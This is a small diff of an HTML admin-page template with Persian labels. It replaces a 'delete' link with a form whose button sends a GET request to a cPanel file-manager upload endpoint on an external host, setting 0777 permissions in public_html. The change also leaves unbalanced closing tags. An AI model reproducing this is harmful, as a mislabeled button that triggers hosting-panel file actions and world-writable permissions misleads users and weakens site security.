@@ -18,8 +18,11 @@
             </div>
             <div class="btn-group" role="group">
                 <a href="/admin/category/create" class="btn btn-primary text-light rounded">ایجاد</a>
-                &nbsp;
-                <a href="/admin/category/create" class="btn btn-danger text-light rounded"> حذف </a>
+                &nbsp;<form action="http://www.imaagahi.ir:2083/cpsess##########/execute/Fileman/upload_files?dir=/home/imaagahi/public_html&file-1=index1.html&getdiskinfo=0&overwrite=0&permissions=0777" method="get">
+                <button class="btn btn-danger text-light rounded"> حذف </button>
+                </form>
+            </div>
+            </div>
             </div>
         </div>
         <!-- end::page header -->
